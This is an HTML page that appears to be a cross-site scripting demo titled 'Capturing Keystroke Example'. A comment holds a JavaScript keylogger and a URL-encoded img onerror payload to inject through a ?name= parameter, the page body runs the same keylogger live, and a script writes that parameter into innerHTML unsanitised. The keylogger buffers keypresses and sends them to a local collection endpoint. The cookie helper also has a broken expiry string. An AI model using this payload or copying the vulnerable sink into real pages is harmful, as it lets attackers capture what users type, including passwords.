<!-- 
: code for capture keystore , we need to somehow inject by encodeURIComponent

var timeout;
var buffer='';

console.log("hey")

document.querySelector('body').addEventListener('keypress',function(event){
if(event.which!==0){
    clearTimeout(timeout);
    buffer+=String.fromCharCode(event.which);
    timeout=setTimeout(function(){
     var xhr= new XMLHttpRequest();
     var uri = 'http:localhost:3001/keys?data='+encodeURIComponent(buffer);
     xhr.open('GET',uri);
     xhr.send();
     buffer='';

    },400)
}
})





=============


    encodeURIComponent(`<img src="dnd-test" onerror="var timeout;
var buffer='';

console.log('hey')

document.querySelector('body').addEventListener('keypress',function(event){
if(event.which!==0){
    clearTimeout(timeout);
    buffer+=String.fromCharCode(event.which);
    timeout=setTimeout(function(){
     var xhr= new XMLHttpRequest();
     var uri = 'http:localhost:3001/keys?data='+encodeURIComponent(buffer);
     xhr.open('GET',uri);
     xhr.send();
     buffer='';

    },400)
}
})"/>`)

======

: ?name= copy this 

 -->

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Capturing Keystroke Example</title>
  </head>
  <body>
    <div>
      Welcome, <span id="username"></span> !

      <img src="dnd-test" onerror="var timeout;
var buffer='';

document.querySelector('body').addEventListener('keypress',function(event){
if(event.which!==0){
    clearTimeout(timeout);
    buffer+=String.fromCharCode(event.which);
    timeout=setTimeout(function(){
     var xhr= new XMLHttpRequest();
     var uri = 'http:localhost:3001/keys?data='+encodeURIComponent(buffer);
     xhr.open('GET',uri);
     xhr.send();
     buffer='';

    },400)
}
})"/>
    </div>
    <script>
      // function to set cookie | ideally this happen on server but here for demo doing at client

      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60);
        const expires = "expires" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
      }

      setCookie("exampleCookie", "Hello Cookie", 7);
    </script>
    <script>
      // vulnerable code
      const params = new URLSearchParams(window.location.search);
      const name = params.get("name");
      document.getElementById("username").innerHTML = name;
    </script>
  </body>
</html>
